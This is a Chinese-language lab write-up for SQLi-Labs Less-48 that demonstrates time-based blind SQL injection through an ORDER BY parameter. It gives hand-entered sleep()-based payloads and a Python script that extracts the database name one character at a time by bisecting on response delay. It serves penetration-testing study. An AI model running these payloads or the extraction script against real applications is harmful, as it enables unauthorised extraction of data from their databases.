【SQLi-Labs】Less-48 ORDER BY 时间盲注 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, ORDER BY注入, 时间盲注, Python自动化

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-48 (GET - Blind Based - Numeric - ORDER BY)
  • 提示：注入点为 sort 参数，纯数字型（页面提示有误，实际源码为 ORDER BY $id），无报错、无回显。

2. 核心原理：ORDER BY 时间盲注

本关卡屏蔽了报错，且页面只渲染正常的用户列表，无查询结果回显，属于盲注环境。

由于是纯数字型注入，可直接将 if() 函数和 sleep() 作为排序表达式执行。但必须注意：ORDER BY 会对结果集的每一行进行求值。若直接写 sleep(5)，页面会卡顿数十秒。必须使用 if(id=1, sleep(5), 0)，限定仅在特定行触发延时。

3. 操作步骤与解析

第一步：手工验证延时

输入 URL：?sort=if(id=1,sleep(5),0)

回显现象：页面加载明显卡顿约 5 秒，随后正常渲染出打乱顺序的用户表格。证明延时通道存在。

第二步：验证 ASCII 条件判断

输入 URL：?sort=if(ascii(substr(database(),1,1))>100,sleep(5),0)

回显现象：页面再次卡顿 5 秒，证明库名首字母 ASCII 码大于 100。

第三步：使用 Python 脚本进行二分法自动化

在 VS Code 中编写并运行脚本，利用 HTTP 请求的耗时差推断字符的 ASCII 码。

import requests
import time

url = "http://localhost/sqli-labs-master/Less-48/"
delay_threshold = 2.5 # 延时阈值，大于2.5秒说明 sleep(3) 执行了

def get_ascii(payload):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        
        # 构造时间盲注 Payload，用 id=1 包裹限制单行触发
        inject = f"if(id=1,if(ascii(substr(({payload}),{pos},1))>{mid},sleep(3),0),0)"
        full_url = f"{url}?sort={inject}"
        
        start_time = time.time()
        response = requests.get(full_url)
        end_time = time.time()
        
        # 核心判断：看响应时间是否超时
        if (end_time - start_time) > delay_threshold:
            low = mid + 1
        else:
            high = mid - 1
            
    return low

def extract(sql):
    global pos
    result = ""
    for i in range(1, 50):
        pos = i
        ascii_code = get_ascii(sql)
        if ascii_code == 0 or ascii_code > 126:
            break
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i} 个字符: {char}，当前结果: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始时间盲注爆破...")
    db_name = extract("select database()")
    print(f"[*] 爆破完成，数据库名为: {db_name}")

代码成分解析：

  • if(id=1, if(...), 0)：利用 id=1 限制排序执行次数，防止全表卡顿。
  • time.time()：记录请求前后时间，利用差值判断是否发生了 sleep(3) 延时。
  • 二分法（Bisection）：通过询问 ascii > mid，不断折半缩小范围，快速锁定字符的 ASCII 码。

运行结果：终端成功输出 security，但在结尾输出了额外的空格。

4. 踩坑记录与复盘

  • 盲注循环终止条件：脚本运行最后打印了多个空格（ASCII 32），是因为当 substr 截取不到字符时，比较结果恒为 False，脚本一路折半至下限 32。在实战中，应将中断条件改为 if ascii_code <= 32: break，防止无效字符循环。
  • 全表卡顿问题：ORDER BY 会对每一行执行表达式，必须配合 if(id=1, ...) 使用，否则测试耗时将成倍增加。

5. 知识点总结

  • 时间盲注（Time-based Blind SQLi）：在无回显、无报错的环境下，利用 sleep() 函数产生的时间差建立布尔通道。
  • ORDER BY 注入的特殊性：需考虑 SQL 执行时对全表求值的特性，合理控制延时的触发范围。
